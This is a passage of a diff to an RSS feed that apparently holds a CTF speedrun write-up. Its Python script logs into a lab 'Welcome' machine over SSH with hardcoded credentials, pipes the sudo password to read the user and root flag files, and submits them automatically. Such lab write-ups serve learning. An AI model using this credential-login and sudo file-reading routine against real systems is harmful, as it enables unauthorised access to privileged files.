+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">ssh2.session&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">Session&lt;/span> &lt;span class="c1"># ssh2-python&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">socket&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">hbrunner&lt;/span> &lt;span class="c1"># Custom module for launching machines and sending flags&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Launch Welcome machine in &amp;#34;speed&amp;#34; mode&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">bot&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">hbrunner&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">Runner&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;welcome&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;speedrun&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;vpn&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Get IP address&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">ipAddress&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">bot&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">getIpAddress&lt;/span>&lt;span class="p">()[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">sock&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">socket&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">socket&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">socket&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">AF_INET&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">socket&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">SOCK_STREAM&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">sock&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">connect&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="n">ipAddress&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">22&lt;/span>&lt;span class="p">))&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">session&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">Session&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">session&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">handshake&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">sock&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># SSH credentials&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">session&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">userauth_password&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;seela&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;rockyou&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">channel&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">session&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">open_session&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Send requested sudo password, then read both flags&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">channel&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">execute&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;echo rockyou|sudo -S find /home/seela/user.txt /root/root.txt -exec cat &lt;/span>&lt;span class="si">{}&lt;/span>&lt;span class="s2"> \;&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">size&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">data&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">channel&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">read&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">while&lt;/span> &lt;span class="n">size&lt;/span> &lt;span class="o">&amp;gt;&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1"># Send flag to platform&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">bot&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sendFlag&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">data&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">decode&lt;/span>&lt;span class="p">())&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">size&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">data&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">channel&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">read&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h3 id="time-score">Time score&lt;/h3>
+&lt;p>This allowed me to achieve a resolution time of less than 1 second (~0.7s).&lt;/p></description></item></channel></rss>
